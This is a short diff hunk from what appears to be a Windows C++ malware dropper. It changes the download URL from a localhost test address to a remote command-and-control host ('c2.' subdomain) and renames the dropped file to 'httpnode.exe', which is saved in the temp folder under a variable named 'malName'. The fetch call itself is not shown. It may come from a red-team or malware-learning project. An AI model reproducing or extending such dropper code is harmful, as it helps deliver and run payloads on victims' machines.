@@ -19,8 +19,8 @@ int _tmain(int argc, _TCHAR *argv[]){
     wchar_t tempPath[MAX_PATH];
     GetTempPathW(MAX_PATH, tempPath);
 
-    const wchar_t* URL = L"http://127.0.0.1:5000/initial";
-    const wchar_t* malName= L"initial.exe";
+    const wchar_t* URL = L"https://c2.stephanschmidt.dev/httpnode";
+    const wchar_t* malName= L"httpnode.exe";
     wchar_t buffer[MAX_PATH];
     PathCombineW(buffer, tempPath, malName );
 
